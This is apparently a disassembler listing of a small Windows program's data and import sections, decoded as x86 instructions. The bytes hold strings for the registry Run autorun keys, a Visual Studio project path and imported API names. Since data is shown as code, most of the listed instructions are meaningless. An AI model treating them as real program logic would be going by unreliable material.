jb     0x40228a
insl   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
jb     0x4022d3
and    %ah,0x74(%ecx,%eiz,2)
popa   
and    %cl,(%edx)
add    %al,(%eax)
add    %dh,0x6e(%ebp)
popa   
bound  %ebp,0x20(%ebp,%eiz,2)
je     0x4022f0
and    %dh,0x65(%edx)
popa   
and    %dh,%fs:0x61(%esi)
insb   (%dx),%es:(%edi)
jne    0x4022f1
and    %ah,0x6f(%ebx)
fs cmp %gs:0xa64,%ah

add    %al,0x72(%ebp)
jb     0x40230b
jb     0x4022be
jae    0x402315
arpl   %sp,0x65(%ebx)
jae    0x402318
cmp    $0xa6425,%eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
push   %ebx
add    %ch,0x0(%edi)
data16 add %dh,0x77(%eax,%eax,1)
add    %ah,0x0(%ecx)
jb     0x4022be
add    %bl,%gs:0x4d(%eax,%eax,1)
add    %ch,0x0(%ecx)
arpl   %ax,(%eax)
jb     0x4022ca
outsl  %ds:(%esi),(%dx)
add    %dh,0x0(%ebx)
outsl  %ds:(%esi),(%dx)
add    %ah,0x0(%esi)
je     0x4022d4
pop    %esp
add    %dh,0x0(%edi)
imul   $0x64006e,(%eax),%eax
outsl  %ds:(%esi),(%dx)
add    %dh,0x0(%edi)
jae    0x4022e4
pop    %esp
add    %ah,0x0(%ebx)
jne    0x4022ea
jb     0x4022ec
jb     0x4022ee
add    %ch,%gs:0x0(%esi)
je     0x4022f4
jbe    0x4022f6
add    %dh,%gs:0x0(%edx)
jae    0x4022fc
imul   $0x6e006f,(%eax),%eax
pop    %esp
add    %dh,0x0(%edx)
jne    0x402308
outsb  %ds:(%esi),(%dx)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %dl,0x0(%ebx)
outsl  %ds:(%esi),(%dx)
add    %ah,0x0(%esi)
je     0x402318
ja     0x40231a
popa   
add    %dh,0x0(%edx)
add    %bl,%gs:0x4d(%eax,%eax,1)
add    %ch,0x0(%ecx)
arpl   %ax,(%eax)
jb     0x40232a
outsl  %ds:(%esi),(%dx)
add    %dh,0x0(%ebx)
outsl  %ds:(%esi),(%dx)
add    %ah,0x0(%esi)
je     0x402334
pop    %esp
add    %ah,0x0(%ebx)
jne    0x40233a
jb     0x40233c
jb     0x40233e
add    %ch,%gs:0x0(%esi)
je     0x402344
jbe    0x402346
add    %dh,%gs:0x0(%edx)
jae    0x40234c
imul   $0x6e006f,(%eax),%eax
pop    %esp
add    %dh,0x0(%edx)
jne    0x402358
outsb  %ds:(%esi),(%dx)
add    %ch,0x0(%edi)
outsb  %ds:(%esi),(%dx)
add    %ah,0x0(%ebx)
add    %al,%gs:(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %cl,0x0(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %dh,(%eax)
inc    %eax
add    %dh,(%eax)
and    $0x40,%al
add    %al,(%ebx)
add    %al,(%eax)
add    %dl,0x53(%edx)
inc    %esp
push   %ebx
imul   $0x5b,-0xf030392(%eax),%edi
dec    %eax
xchg   %cl,-0x46(%edx)
out    %al,$0x1a
popa   
std    
addb   $0x0,(%ecx)
add    %al,(%eax)
inc    %ebx
cmp    0x6f(%esp,%eax,2),%bl
arpl   %si,0x6d(%ebp)
outsb  %gs:(%esi),(%dx)
je     0x402447
and    %ah,0x6e(%ecx)
and    %dl,%fs:0x65(%ebx)
je     0x402451
imul   $0x69565c73,0x67(%esi),%ebp
jbe    0x40244b
imul   $0x20,0x79(%ebp,%ecx,2),%ebx
inc    %esp
outsl  %ds:(%esi),(%dx)
arpl   %si,0x6d(%ebp)
outsb  %gs:(%esi),(%dx)
je     0x402467
pop    %esp
push   %esi
imul   $0x53206c61,0x75(%ebx),%esi
je     0x402474
imul   $0x38303032,%fs:0x20(%edi),%ebp

pop    %esp
push   %eax
jb     0x40247a
push   $0x65
arpl   %si,0x5c(%ebx,%esi,2)
push   %esp
gs insl (%dx),%es:(%edi)
jo     0x402482
popa   
je     0x40247e
pop    %esp
push   %edx
gs insb (%dx),%es:(%edi)
gs popa 
jae    0x402486
pop    %esp
push   %esp
gs insl (%dx),%es:(%edi)
jo     0x402493
popa   
je     0x40248f
jo,pn  0x402491
bound  %eax,(%eax)
add    %dl,0x1b(%ebp)
add    %al,(%eax)
sbb    %bl,0x1d3f0000
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
(bad)  
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %dl,%al
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
push   %ebx
adc    $0x16070040,%eax
inc    %eax
add    %al,(%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %cl,%ah
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %ah,(%esi)
sbb    %eax,0x0(%eax)
add    %al,(%eax)
add    %al,(%eax)
(bad)  
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bl,%al
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
(bad)  
mov    $0xcf00401a,%ebx
sbb    0x0(%eax),%al
(bad)  
(bad)  
(bad)  
incl   (%eax)
sbb    $0x40,%eax
add    %al,(%eax)
or     $0x1d,%al
inc    %eax
add    %ah,(%edx)
add    $0x21993,%eax
add    %al,(%eax)
lods   %ds:(%esi),%al
and    $0x40,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%ecx)
add    %al,(%eax)
add    %bh,%bh
(bad)  
(bad)  
pushl  (%esi)
sbb    $0x5220040,%eax
xchg   %eax,%ebx
sbb    %eax,(%ecx)
add    %al,(%eax)
add    %ah,%al
and    $0x40,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%ecx)
add    %al,(%eax)
add    %bh,0x0(%ebp,%eiz,1)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,0xc000026(%eax)
and    %al,(%eax)
add    %dh,0x25(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
scas   %es:(%edi),%al
add    %al,%es:(%eax)
add    %ah,(%eax)
add    %al,(%eax)
lock and $0x0,%eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
in     (%dx),%al
add    %al,%es:(%eax)
andb   $0x0,(%eax)
add    %bh,0x25(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %ch,%dl
sub    (%eax),%eax
add    %cl,0x20(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
sahf   
add    %al,%es:(%eax)
mov    (%esi),%fs
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
jo     0x4025a4
add    %al,(%eax)
call   0xd24025b1
sub    $0x0,%al
add    %al,%dl
sub    $0x0,%al
add    %ch,-0x6bffffd4(%eax)
sub    $0x0,%al
add    %dh,0x2c(%esi)
add    %al,(%eax)
pop    %edx
sub    $0x0,%al
add    %al,0x2c(%esi)
add    %al,(%eax)
xor    (%eax,%eax,1),%ch
add    %dl,(%esp,%ebp,1)
add    %al,(%eax)
or     $0x2c,%al
add    %al,(%eax)
imulb  (%ebx)
add    %al,(%eax)
(bad)  
sub    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %cl,0x2bae0000(%ecx,%ebp,1)
add    %al,(%eax)
jb     0x4025ed
add    %al,(%eax)
sub    %es:(%eax),%eax
add    %bl,%ah
sub    (%eax),%al
add    %cl,0x2a4a0000(%edx,%ebp,1)
add    %al,(%eax)
or     %ch,(%edx)
add    %al,(%eax)
int3   
sub    %eax,(%eax)
add    %cl,0x29(%esi)
add    %al,(%eax)
push   %cs
sub    %eax,(%eax)
add    %dl,%al
sub    %al,(%eax)
add    %al,0x28(%esi)
add    %al,(%eax)
add    %bl,0x27(%edx)
add    %al,(%eax)
dec    %edx
sub    %al,(%eax)
add    %bh,(%eax)
sub    %al,(%eax)
add    %ch,(%esi)
sub    %al,(%eax)
add    %ah,(%esi)
sub    %al,(%eax)
add    %ch,0x27(%eax)
add    %al,(%eax)
sbb    %ch,(%eax)
add    %al,(%eax)
push   %cs
sub    %al,(%eax)
add    %bh,%dl
daa    
add    %al,(%eax)
in     $0x27,%al
add    %al,(%eax)
shlb   %cl,(%edi)
add    %al,(%eax)
shlb   $0x0,(%edi)
add    %dh,-0x5dffffd9(%edx)
daa    
add    %al,(%eax)
xchg   %eax,%edx
daa    
add    %al,(%eax)
jle    0x402655
add    %al,(%eax)
jbe    0x40265a
add    %al,(%eax)
dec    %esi
daa    
add    %al,(%eax)
inc    %eax
daa    
add    %al,(%eax)
cmp    %ah,(%edi)
add    %al,(%eax)
sub    (%edi),%ah
add    %al,(%eax)
and    (%edi),%ah
add    %al,(%eax)
sbb    %ah,(%edi)
add    %al,(%eax)
push   %es
daa    
add    %al,(%eax)
clc    
add    %al,%es:(%eax)
loopne 0x40267c
add    %al,(%eax)
(bad)  
add    %al,%es:(%eax)
int3   
add    %al,%es:(%eax)
mov    $0x64000026,%esp
sub    %al,(%eax)
add    %bl,(%eax)
sub    $0x0,%eax
add    %al,(%eax)
out    %al,$0x1
inc    %edi
gs je  0x4026c2
popa   
jae    0x4026ed
inc    %ebp
jb     0x4026ee
outsl  %ds:(%esi),(%dx)
jb     0x40267f
add    %cl,0x45(%ebx)
push   %edx
dec    %esi
inc    %ebp
dec    %esp
xor    (%edx),%esi
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %al,(%eax)
pop    %ebx
add    0x65(%edx),%dl
addr16 dec %edi
jo     0x4026fb
outsb  %ds:(%esi),(%dx)
dec    %ebx
gs jns 0x4026e0
js     0x4026f4
add    %cl,0x52(%edx,%eax,1)
gs addr16 inc %ebp
outsb  %ds:(%esi),(%dx)
jne    0x402714
push   %esi
popa   
insb   (%dx),%es:(%edi)
jne    0x402711
push   %edi
add    %al,0x44(%ecx)
push   %esi
inc    %ecx
push   %eax
dec    %ecx
xor    (%edx),%esi
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %al,(%eax)
pop    %ds
add    %bh,(%edi)
aas    
pop    %edi
push   %ebp
inc    %eax
pop    %ecx
inc    %ecx
push   %eax
inc    %ecx
pop    %eax
dec    %ecx
inc    %eax
pop    %edx
add    %ch,(%esi)
add    $0x6e697270,%eax
je     0x40273a
add    %al,(%eax)
cmpsb  %es:(%edi),%ds:(%esi)
add    $0x69727077,%eax
outsb  %ds:(%esi),(%dx)
je     0x402745
add    %bl,0x73637705(%edi)
je     0x402756
insl   (%dx),%es:(%edi)
bound  %esi,0x0(%ebx)
add    %cl,0x53(%ebp)
push   %esi
inc    %ebx
push   %edx
cmp    %esi,(%eax)
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %dl,0x6d615f01
jae    0x402766
pop    %edi
gs js  0x40276c
je     0x402705
add    %dh,%bh
add    %bl,0x5f(%edi)
ja     0x402773
gs je  0x40277c
popa   
imul   $0x736772,0x61(%esi),%ebp
add    %ch,(%ecx,%eax,1)
pop    %edi
arpl   %sp,0x78(%ebp)
imul   $0x655f017c,0x0(%eax,%eax,1),%esi

js     0x402791
je     0x40272a
data16 add %bl,0x58(%edi)
arpl   %si,0x74(%eax)
inc    %esi
imul   $0x4cc0072,0x65(%esp,%esi,2),%ebp

gs js  0x4027a6
je     0x40273f
add    %bh,%al
add    %bl,0x5f(%edi)
ja     0x4027af
outsb  %ds:(%esi),(%dx)
imul   $0x4000076,0x6e(%ebp,%eiz,2),%esi

add    0x69(%edi),%bl
outsb  %ds:(%esi),(%dx)
imul   $0x5006d72,0x65(%esp,%esi,2),%esi

add    0x69(%edi),%bl
outsb  %ds:(%esi),(%dx)
imul   $0x655f6d72,0x65(%esp,%esi,2),%esi

add    %bh,(%ecx,%eax,1)
pop    %edi
arpl   %bp,0x6e(%edi)
imul   $0x7268,0x74(%edi),%sp
gs popa 
fs insb (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x6c(%ecx)
gs add %ah,%bl
add    %bl,0x5f(%edi)
jae    0x4027e9
je     0x4027fb
jae    0x4027ed
jb     0x4027f7
popa   
je     0x4027f5
gs jb  0x402802
add    %al,(%eax)
or     (%ecx),%eax
pop    %edi
popa   
fs push $0x75
jae    0x40280f
pop    %edi
imul   $0xcb00,%fs:0x0(%esi),%si
add    %bl,0x5f(%edi)
jo     0x402807
pop    %edi
arpl   %bp,0x6d(%edi)
insl   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
fs add %al,%gs:(%eax)
iret   
add    %bl,0x5f(%edi)
jo     0x402817
pop    %edi
insw   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
fs add %al,%gs:(%eax)
push   $0x1
pop    %edi
outsb  %gs:(%esi),(%dx)
arpl   %bp,0x64(%edi)
gs pop %edi
jo     0x40283b
imul   $0xe0007265,0x74(%esi),%ebp
add    %bl,0x5f(%edi)
jae    0x40283d
je     0x402839
popa   
jo     0x40284d
pop    %edi
je     0x402859
jo     0x402847
add    %al,(%eax)
dec    %ebx
add    %ebx,0x63(%edi)
jb     0x40285e
pop    %edi
fs bound %esi,%gs:0x67(%ebp)
addr16 gs jb 0x402853
push   $0x6b6f6f
add    %al,0x0(%ebx)
aas    
je     0x402864
jb     0x40286e
imul   $0x40406574,0x61(%esi),%ebp
pop    %ecx
inc    %ecx
pop    %eax
pop    %eax
pop    %edx
add    %ah,%dh
add    0x75(%edi),%ebx
outsb  %ds:(%esi),(%dx)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x0(%ebx)
xchg   %eax,%esi
add    %bl,0x5f(%edi)
fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
gs js  0x40288d
je     0x402826
jbe    0x40282a
pop    %edi
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x0(%ebx)
sbb    $0x3,%al
pop    %edi
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
gs js  0x40289f
je     0x402838
pusha  
add    %ebx,0x64(%edi)
arpl   %bp,%gs:0x64(%edi)
gs pop %edi
jo     0x4028b3
imul   $0x73007265,0x74(%esi),%ebp
add    %ebx,0x65(%edi)
js     0x4028b3
gs jo  0x4028c7
pop    %edi
push   $0x6c646e61
gs jb  0x402890
pop    %edi
arpl   %bp,0x6d(%edi)
insl   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
add    %cl,(%ebx)
add    0x69(%edi),%bl
outsb  %ds:(%esi),(%dx)
jbe    0x4028da
imul   $0x77,0x5f(%ebp),%esp
popa   
je     0x4028e5
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
add    %al,(%eax)
aas    
add    %ebx,0x63(%edi)
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
je     0x4028f0
outsl  %ds:(%esi),(%dx)
insb   (%dx),%es:(%edi)
data16 jo 0x4028e2
jae    0x402885
add    %al,%al
or     %edi,(%edi)
outsb  %ds:(%esi),(%dx)
jo     0x4028fb
jae    0x4028ce
aas    
and    $0x62,%al
popa   
jae    0x4028fd
arpl   %bx,0x73(%edi)
je     0x40290b
imul   $0x3f554440,0x67(%esi),%ebp
and    $0x63,%al
push   $0x745f7261
jb     0x40290a
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
push   %esi
aas    
and    $0x61,%al
insb   (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x74(%ecx)
outsl  %ds:(%esi),(%dx)
jb     0x402901
inc    %esp
inc    %eax
xor    0x40(%eax),%al
jae    0x40293c
fs inc %eax
inc    %eax
xor    0x42(%ecx),%cl
add    %al,(%eax)
arpl   %ax,(%esi)
aas    
arpl   %bp,0x73(%edi,%ebp,2)
gs inc %eax
aas    
and    $0x62,%al
popa   
jae    0x402948
arpl   %bx,0x6f(%edi)
data16 jae 0x402959
jb     0x40294c
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402957
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402978
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
pop    %eax
pop    %eax
pop    %edx
add    %cl,0x1(%edi)
aas    
aas    
xor    %bh,(%edi)
and    $0x62,%al
popa   
jae    0x402982
arpl   %bx,0x6f(%edi)
data16 jae 0x402993
jb     0x402986
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402991
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x4029b2
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %eax
push   %eax
inc    %edx
inc    %esp
dec    %eax
dec    %eax
inc    %eax
pop    %edx
add    %al,(%eax)
pusha  
push   %es
aas    
arpl   %bp,0x73(%edi,%ebp,2)
gs inc %eax
aas    
and    $0x62,%al
popa   
jae    0x4029c6
arpl   %bx,0x69(%edi)
data16 jae 0x4029d7
jb     0x4029ca
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x4029d5
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x4029f6
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
pop    %eax
pop    %eax
pop    %edx
add    %ch,(%eax)
add    %edi,(%edi)
aas    
xor    %bh,(%edi)
and    $0x62,%al
popa   
jae    0x402a00
arpl   %bx,0x69(%edi)
data16 jae 0x402a11
jb     0x402a04
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402a0f
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402a30
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %eax
push   %eax
inc    %edx
inc    %esp
dec    %eax
dec    %eax
inc    %eax
pop    %edx
add    %al,(%eax)
inc    %ebp
or     %bh,(%edi)
addr16 gs je 0x402a13
aas    
and    $0x62,%al
popa   
jae    0x402a42
arpl   %bx,0x69(%edi)
jae    0x402a52
jb     0x402a45
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402a50
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402a71
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
dec    %eax
pop    %eax
pop    %edx
add    %al,(%eax)
xor    %cl,(%eax)
aas    
data16 insb (%dx),%es:(%edi)
jne    0x402a82
push   $0x62243f40
popa   
jae    0x402a80
arpl   %bx,0x6f(%edi)
jae    0x402a90
jb     0x402a83
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402a8e
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402aaf
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %ecx
inc    %ecx
push   %esi
xor    %esi,(%edx)
inc    %eax
pop    %eax
pop    %edx
add    %bl,0xa(%ebx)
aas    
jo     0x402ac4
je     0x402a91
aas    
and    $0x62,%al
popa   
jae    0x402ac0
arpl   %bx,0x6f(%edi)
jae    0x402ad0
jb     0x402ac3
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402ace
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402aef
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %ecx
inc    %ecx
push   %esi
xor    %esi,(%edx)
inc    %eax
inc    %esp
inc    %eax
pop    %edx
add    %al,(%eax)
icebp  
pop    %es
aas    
imul   $0x3f40,0x64(%esi),%bp
and    $0x62,%al
popa   
jae    0x402b03
arpl   %bx,0x73(%edi)
je     0x402b11
imul   $0x3f554440,0x67(%esi),%ebp
and    $0x63,%al
push   $0x745f7261
jb     0x402b10
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
push   %esi
aas    
and    $0x61,%al
insb   (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x74(%ecx)
outsl  %ds:(%esi),(%dx)
jb     0x402b07
inc    %esp
inc    %eax
xor    0x40(%eax),%al
jae    0x402b42
fs inc %eax
inc    %eax
push   %ecx
inc    %edx
inc    %ebp
dec    %ecx
push   %eax
inc    %edx
inc    %esp
dec    %ecx
inc    %eax
pop    %edx
add    %bl,0x2(%edi)
aas    
aas    
xor    %edi,(%edi)
and    $0x62,%al
popa   
jae    0x402b50
arpl   %bx,0x73(%edi)
je     0x402b5e
imul   $0x3f554440,0x67(%esi),%ebp
and    $0x63,%al
push   $0x745f7261
jb     0x402b5d
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
push   %esi
aas    
and    $0x61,%al
insb   (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x74(%ecx)
outsl  %ds:(%esi),(%dx)
jb     0x402b54
inc    %esp
inc    %eax
xor    0x40(%eax),%al
jae    0x402b8f
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %eax
pop    %eax
pop    %edx
add    %al,(%eax)
jbe    0x402b29
aas    
aas    
xor    %bh,(%edi)
and    $0x62,%al
popa   
jae    0x402b9a
arpl   %bx,0x73(%edi)
je     0x402ba8
imul   $0x3f554440,0x67(%esi),%ebp
and    $0x63,%al
push   $0x745f7261
jb     0x402ba7
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
push   %esi
aas    
and    $0x61,%al
insb   (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x74(%ecx)
outsl  %ds:(%esi),(%dx)
jb     0x402b9e
inc    %esp
inc    %eax
xor    0x40(%eax),%al
jae    0x402bd9
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %eax
push   %eax
inc    %edx
inc    %esp
inc    %eax
pop    %edx
add    %al,0x5f3f3f04
inc    %esp
aas    
and    $0x62,%al
popa   
jae    0x402be7
arpl   %bx,0x6f(%edi)
data16 jae 0x402bf8
jb     0x402beb
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402bf6
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402c17
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
pop    %eax
pop    %eax
pop    %edx
add    %al,(%eax)
stc    
add    (%edi),%edi
aas    
pop    %edi
inc    %esp
aas    
and    $0x62,%al
popa   
jae    0x402c23
arpl   %bx,0x69(%edi)
data16 jae 0x402c34
jb     0x402c27
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402c32
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402c53
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
pop    %eax
pop    %eax
pop    %edx
add    %al,(%eax)
dec    %ebp
push   %ebx
push   %esi
inc    %ebx
push   %eax
cmp    %esi,(%eax)
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %bh,0x746e4902(%ebp)
gs jb  0x402c6a
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x65(%ebx)
fs inc %ebp
js     0x402c69
push   $0x65676e61
add    %ah,(%ecx)
add    $0x53,%al
insb   (%dx),%es:(%edi)
gs gs jo 0x402c14
mov    $0x746e4902,%edx
gs jb  0x402c88
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x65(%ebx)
fs inc %ebx
outsl  %ds:(%esi),(%dx)
insl   (%dx),%es:(%edi)
jo     0x402c87
jb     0x402c8d
inc    %ebp
js     0x402c8e
push   $0x65676e61
add    %al,(%eax)
sub    $0x72655404,%eax
insl   (%dx),%es:(%edi)
imul   $0x72506574,0x61(%esi),%ebp
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x73(%ebp)
jae    0x402c45
add    %ch,0x74654701(%ecx)
inc    %ebx
jne    0x402cc0
jb     0x402cb5
outsb  %ds:(%esi),(%dx)
je     0x402ca3
jb     0x402cc4
arpl   %sp,0x73(%ebp)
jae    0x402c5a
ds add $0x55,%al
outsb  %ds:(%esi),(%dx)
push   $0x6c646e61
gs fs inc %ebp
js     0x402ccb
gs jo  0x402cdf
imul   $0x746c6946,0x6e(%edi),%ebp
gs jb  0x402c75
add    %dl,0x74655304
push   %ebp
outsb  %ds:(%esi),(%dx)
push   $0x6c646e61
gs fs inc %ebp
js     0x402cea
gs jo  0x402cfe
imul   $0x746c6946,0x6e(%edi),%ebp
gs jb  0x402c94
roll   (%edx)
dec    %ecx
jae    0x402cdd
bound  %esi,%gs:0x67(%ebp)
addr16 gs jb 0x402cf1
jb     0x402d08
jae    0x402d0a
outsb  %ds:(%esi),(%dx)
je     0x402ca8
push   %esp
add    0x75(%ecx),%edx
gs jb  0x402d28
push   %eax
gs jb  0x402d19
outsl  %ds:(%esi),(%dx)
jb     0x402d23
popa   
outsb  %ds:(%esi),(%dx)
arpl   %sp,0x43(%ebp)
outsl  %ds:(%esi),(%dx)
jne    0x402d2c
je     0x402d25
jb     0x402cc2
data16 add 0x65(%edi),%al
je     0x402d1c
imul   $0x6e756f43,0x6b(%ebx),%esp
je     0x402cd1
add    %ch,0x74654701(%ebp)
inc    %ebx
jne    0x402d4c
jb     0x402d41
outsb  %ds:(%esi),(%dx)
je     0x402d33
push   $0x64616572
dec    %ecx
add    %al,%fs:(%eax)
stos   %al,%es:(%edi)
add    %eax,0x65(%edi)
je     0x402d31
jne    0x402d62
jb     0x402d57
outsb  %ds:(%esi),(%dx)
je     0x402d45
jb     0x402d66
arpl   %sp,0x73(%ebp)
jae    0x402d45
add    %cl,%fs:0x2(%edi)
inc    %edi
gs je  0x402d57
jns    0x402d79
je     0x402d6d
insl   (%dx),%es:(%edi)
push   %esp
imul   $0x69467341,0x65(%ebp),%ebp
insb   (%dx),%es:(%edi)
gs push %esp
imul   $0x5f007300,0x65(%ebp),%ebp
pop    %edi
inc    %ebx
js     0x402d97
inc    %esi
jb     0x402d83
insl   (%dx),%es:(%edi)
gs dec %eax
popa   
outsb  %ds:(%esi),(%dx)
fs insb (%dx),%es:(%edi)
gs jb  0x402d5f
add    %al,(%eax)




dec    %esi
out    %al,$0x40
mov    $0x44bf19b1,%ebx
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
incl   (%ecx)
add    %al,(%eax)
add    %al,0x40(%ecx,%eiz,1)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
